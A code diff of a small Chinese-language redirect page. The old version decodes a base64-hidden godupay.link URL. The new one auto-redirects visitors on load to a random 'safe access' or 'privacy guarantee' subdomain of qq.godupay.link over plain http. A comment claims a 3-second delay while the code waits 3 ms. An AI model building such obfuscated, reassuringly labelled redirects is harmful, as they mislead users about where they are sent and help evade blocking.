@@ -1,25 +1,45 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <meta charset="UTF-8">
-    <title>跳转页面</title>
-  </head>
-  <body>
-	  <!-- Global site tag (gtag.js) - Google Analytics -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=UA-145418913-1"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
+<head>
+  <meta charset="UTF-8">
+  <title>自动跳转页面</title>
+  <script>
+    function redirectToRandomURL() {
+      // 定义可选的安全访问选项
+      var options = [
+        "安全访问",
+        "隐私保证",
+        "安全加密",
+        "安全网站"
+     
+      ];
 
-  gtag('config', 'UA-145418913-1');
-</script>
+      // 从选项中随机选择一个
+      var randomOption = options[Math.floor(Math.random() * options.length)];
 
-    <script>
-      var url = "aHR0cHM6Ly9hLmFhLmEuYS5nb2R1cGF5Lmxpbmsv";
-      var decodedUrl = atob(url); // 对 URL 进行 Base64 解码
-      window.location.href = decodedUrl; // 跳转到解码后的 URL
-    </script>
-	  
-  </body>
+      // 定义特殊字符
+      var specialCharacter = ".";
+
+      // 定义域名
+      var domain = "qq.godupay.link";
+
+      // 构造完整的跳转URL
+      var redirectURL = "http://" + randomOption + specialCharacter + domain;
+
+      // 延迟一定时间后执行跳转
+      setTimeout(function() {
+        window.location.href = redirectURL;
+      }, 3); // 延迟3秒钟
+    }
+
+    // 页面加载后自动触发跳转
+    window.onload = redirectToRandomURL;
+  </script>
+  
+  
+    <button onclick="redirectToRandomURL()">点击跳转</button>
+</head>
+<body>
+
+</body>
 </html>
